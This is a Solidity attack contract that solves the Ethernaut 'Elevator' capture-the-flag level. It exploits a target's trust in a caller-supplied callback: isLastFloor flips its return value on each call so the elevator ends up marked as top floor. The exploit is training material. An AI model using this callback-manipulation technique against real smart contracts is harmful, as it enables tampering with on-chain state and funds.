// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./interfaces/IElevator.sol";

/**
 * @title Elevator Attack (Ethernaut Challenge Level 11 - Elevator)
 * @author Emre Tepe (@emretepedev)
 * @notice Attack contract for level 11
 * @custom:ethernaut https://ethernaut.openzeppelin.com/level/0xaB4F3F2644060b2D960b0d88F0a42d1D27484687
 */
contract ElevatorAttack {
    bool private _isLastFloor = true;

    /*//////////////////////////////////////////////////////////////
                                Attack
    //////////////////////////////////////////////////////////////*/

    /**
     * @notice Attack and solve the level
     * @param target Address of target contract
     */
    function attack(IElevator target) external {
        target.goTo(0);

        require(target.top() && 0 == target.floor(), "Elevator: Attack failed");
    }

    /*//////////////////////////////////////////////////////////////
                            Helpers & Others
    //////////////////////////////////////////////////////////////*/

    function isLastFloor(
        uint256 /* floor */
    ) external returns (bool) {
        return _isLastFloor = !_isLastFloor;
    }
}
